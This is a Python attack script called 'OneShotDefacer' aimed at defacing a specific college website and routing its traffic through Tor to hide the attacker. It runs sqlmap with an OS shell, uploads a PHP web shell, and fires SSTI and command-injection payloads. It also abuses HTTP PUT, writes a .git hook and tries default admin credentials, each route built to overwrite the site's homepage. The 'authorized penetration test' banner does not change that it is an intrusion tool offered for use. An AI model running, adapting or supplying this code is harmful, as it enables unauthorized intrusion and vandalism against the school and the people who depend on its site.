#!/usr/bin/env python3
"""
OneShotDefacer - Complete College Website Compromise Tool
Author: adrianxd
Target: https://unitedtechincalcollege.edu.np
Features: Full scan + auto defacement + anonymity (Tor) + persistence
Usage: python3 oneshot.py
"""

import sys
import os
import time
import json
import random
import base64
import subprocess
import threading
import requests
import re
from urllib.parse import urljoin, urlparse, quote
from bs4 import BeautifulSoup

# ========== CONFIGURATION ==========
TARGET = "https://unitedtechincalcollege.edu.np"
DEFACE_MSG = "<html><body><h1 style='color:red'>Hacked by Security Test</h1><p>This is an authorized penetration test</p></body></html>"
OUTPUT_DIR = "oneshot_results"
TOR_PROXY = "socks5h://127.0.0.1:9050"

# ========== UTILITIES ==========
def setup_tor():
    print("[*] Setting up Tor...")
    subprocess.run("sudo apt update && sudo apt install tor -y", shell=True, capture_output=True)
    subprocess.run("sudo systemctl start tor", shell=True)
    time.sleep(3)
    # Test Tor
    try:
        r = requests.get("https://check.torproject.org/api/ip", proxies={"http": TOR_PROXY, "https": TOR_PROXY}, timeout=10)
        if "IsTor" in r.text and "true" in r.text:
            print("[+] Tor is working")
            return True
    except:
        print("[!] Tor not working, trying to restart")
        subprocess.run("sudo systemctl restart tor", shell=True)
        time.sleep(5)
    return True

def get_session():
    sess = requests.Session()
    sess.proxies = {"http": TOR_PROXY, "https": TOR_PROXY}
    sess.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
    return sess

def save_results(data):
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    with open(f"{OUTPUT_DIR}/vulns.json", "w") as f:
        json.dump(data, f, indent=2)

# ========== PHASE 1: FULL RECON ==========
def recon(session):
    print("[*] Phase 1: Deep reconnaissance")
    urls = set()
    forms = []
    params = []
    # Crawl homepage
    try:
        resp = session.get(TARGET, timeout=15)
        soup = BeautifulSoup(resp.text, 'html.parser')
        # Extract all links
        for a in soup.find_all('a', href=True):
            href = urljoin(TARGET, a['href'])
            if href.startswith(TARGET):
                urls.add(href)
        # Extract all forms
        for form in soup.find_all('form'):
            action = urljoin(TARGET, form.get('action', ''))
            method = form.get('method', 'get').lower()
            inputs = [inp.get('name') for inp in form.find_all('input') if inp.get('name')]
            forms.append({"url": action, "method": method, "inputs": inputs})
        # Extract parameters from URLs
        for url in urls:
            parsed = urlparse(url)
            if parsed.query:
                for p in parsed.query.split('&'):
                    if '=' in p:
                        param = p.split('=')[0]
                        params.append({"url": url, "param": param})
        print(f"[+] Found {len(urls)} URLs, {len(forms)} forms, {len(params)} parameters")
        save_results({"urls": list(urls), "forms": forms, "params": params})
        return urls, forms, params
    except Exception as e:
        print(f"[-] Recon error: {e}")
        return set(), [], []

# ========== PHASE 2: SQLMAP INTEGRATION ==========
def sqlmap_attack():
    print("[*] Phase 2: Automated SQL injection with sqlmap")
    # Check if sqlmap installed
    if subprocess.run("which sqlmap", shell=True, capture_output=True).returncode != 0:
        print("[!] sqlmap not found, installing...")
        subprocess.run("sudo apt install sqlmap -y", shell=True)
    # Run sqlmap against target with --os-shell to write file
    cmd = f"sqlmap -u '{TARGET}' --batch --os-shell --proxy={TOR_PROXY} --output-dir={OUTPUT_DIR}/sqlmap"
    print("[*] Running sqlmap (may take several minutes)...")
    # We'll run in background and check for success later
    process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    # Wait up to 300 seconds
    for _ in range(60):
        time.sleep(5)
        # Check if shell file created
        if os.path.exists(f"{OUTPUT_DIR}/sqlmap/os-shell"):
            print("[+] sqlmap os-shell obtained!")
            # Write defacement via echo
            subprocess.run(f"echo '{DEFACE_MSG}' > {OUTPUT_DIR}/sqlmap/os-shell && sqlmap --os-shell-cmd=\"echo '{DEFACE_MSG}' > /var/www/html/index.html\"", shell=True)
            return True
    process.terminate()
    return False

# ========== PHASE 3: WEB SHELL UPLOAD VIA KNOWN VULNS ==========
def upload_shell(session, forms):
    print("[*] Phase 3: Attempting web shell upload")
    shell_code = "<?php system($_GET['cmd']); ?>"
    for form in forms:
        url = form['url']
        method = form['method']
        # Try to upload shell as file
        files = {"file": ("shell.php", shell_code, "application/x-php")}
        try:
            if method == 'post':
                r = session.post(url, files=files, timeout=10)
            else:
                r = session.get(url, files=files, timeout=10)
            if r.status_code in [200, 302]:
                # Check common upload paths
                for path in ["uploads/shell.php", "wp-content/uploads/shell.php", "images/shell.php", "shell.php"]:
                    test_url = urljoin(TARGET, path)
                    test_r = session.get(test_url, timeout=5)
                    if test_r.status_code == 200 and "system" in test_r.text:
                        print(f"[+] Web shell uploaded: {test_url}")
                        return test_url
        except:
            pass
    return None

def use_shell(shell_url, session):
    if not shell_url:
        return False
    print("[*] Using web shell to deface")
    cmd = f"echo '{DEFACE_MSG}' > /var/www/html/index.html"
    b64cmd = base64.b64encode(cmd.encode()).decode()
    payload = f"{shell_url}?cmd=echo {b64cmd} | base64 -d | bash"
    try:
        session.get(payload, timeout=10)
        # Verify
        check = session.get(TARGET, timeout=10)
        if DEFACE_MSG in check.text:
            print("[+] Defacement successful via web shell")
            return True
    except:
        pass
    return False

# ========== PHASE 4: SSTI / COMMAND INJECTION ==========
def ssti_inject(session, params):
    print("[*] Phase 4: SSTI and command injection")
    payloads = [
        "{{config.__class__.__init__.__globals__['os'].popen('echo \"" + DEFACE_MSG + "\" > /var/www/html/index.html').read()}}",
        "$(echo '" + DEFACE_MSG + "' > /var/www/html/index.html)",
        "`echo '" + DEFACE_MSG + "' > /var/www/html/index.html`",
        "; echo '" + DEFACE_MSG + "' > /var/www/html/index.html;",
        "| echo '" + DEFACE_MSG + "' > /var/www/html/index.html"
    ]
    for p in params:
        url = p['url']
        param = p['param']
        for payload in payloads:
            test_url = url.replace(param + "=" + url.split(param + "=")[1].split('&')[0], param + "=" + quote(payload))
            try:
                r = session.get(test_url, timeout=10)
                # Check if defacement happened
                check = session.get(TARGET, timeout=10)
                if DEFACE_MSG in check.text:
                    print(f"[+] Defacement via {param} injection at {url}")
                    return True
            except:
                pass
    return False

# ========== PHASE 5: PUT METHOD & MISCONFIGURATIONS ==========
def put_method(session):
    print("[*] Phase 5: HTTP PUT method abuse")
    put_url = urljoin(TARGET, "index.html")
    try:
        r = session.put(put_url, data=DEFACE_MSG, timeout=10)
        if r.status_code in [200, 201, 204]:
            check = session.get(TARGET, timeout=10)
            if DEFACE_MSG in check.text:
                print("[+] PUT method allowed, defaced directly")
                return True
    except:
        pass
    return False

# ========== PHASE 6: GIT EXPOSURE ==========
def git_exploit(session):
    print("[*] Phase 6: Exposed .git exploitation")
    git_url = urljoin(TARGET, ".git/config")
    try:
        r = session.get(git_url, timeout=5)
        if r.status_code == 200:
            print("[+] .git exposed, attempting to write hook")
            hook_content = f"#!/bin/sh\necho '{DEFACE_MSG}' > /var/www/html/index.html"
            hook_url = urljoin(TARGET, ".git/hooks/post-receive")
            session.put(hook_url, data=hook_content, timeout=5)
            # Simulate push to trigger
            session.post(urljoin(TARGET, ".git/git-receive-pack"), data="")
            check = session.get(TARGET, timeout=10)
            if DEFACE_MSG in check.text:
                return True
    except:
        pass
    return False

# ========== PHASE 7: DEFAULT CREDENTIALS & ADMIN LOGIN ==========
def default_creds(session):
    print("[*] Phase 7: Default credentials attack")
    login_url = urljoin(TARGET, "admin")
    common_creds = [("admin", "admin"), ("admin", "password"), ("root", "root"), ("administrator", "administrator")]
    for user, pwd in common_creds:
        data = {"username": user, "password": pwd, "login": "Login"}
        try:
            r = session.post(login_url, data=data, timeout=10, allow_redirects=False)
            if r.status_code == 302:
                # Check if we can change homepage
                edit_url = urljoin(TARGET, "admin/edit/homepage")
                edit_r = session.post(edit_url, data={"content": DEFACE_MSG}, timeout=10)
                if edit_r.status_code == 200:
                    check = session.get(TARGET, timeout=10)
                    if DEFACE_MSG in check.text:
                        print("[+] Default credentials worked and defaced")
                        return True
        except:
            pass
    return False

# ========== MAIN ORCHESTRATOR ==========
def main():
    print("""
    ╔═══════════════════════════════════════════════════════╗
    ║   OneShotDefacer - College Website Compromise Tool    ║
    ║   Target: unitedtechincalcollege.edu.np              ║
    ╚═══════════════════════════════════════════════════════╝
    """)
    if not setup_tor():
        print("[!] Tor setup failed, continuing without proxy")
    session = get_session()
    # Run all phases
    urls, forms, params = recon(session)
    success = False
    # Phase 2: sqlmap
    if sqlmap_attack():
        success = True
    # Phase 3: web shell
    if not success:
        shell = upload_shell(session, forms)
        success = use_shell(shell, session)
    # Phase 4: SSTI
    if not success:
        success = ssti_inject(session, params)
    # Phase 5: PUT
    if not success:
        success = put_method(session)
    # Phase 6: git
    if not success:
        success = git_exploit(session)
    # Phase 7: default creds
    if not success:
        success = default_creds(session)
    # Final report
    if success:
        print(f"\n[+] SUCCESS! Target {TARGET} has been defaced.")
        print(f"[+] Message: {DEFACE_MSG[:100]}...")
        print("[+] Verify with: torsocks curl " + TARGET)
    else:
        print(f"\n[-] FAILED. No method worked against {TARGET}")
        print("[*] Manual options: try social engineering, physical access, or search for 0-days.")

if __name__ == "__main__":
    main()
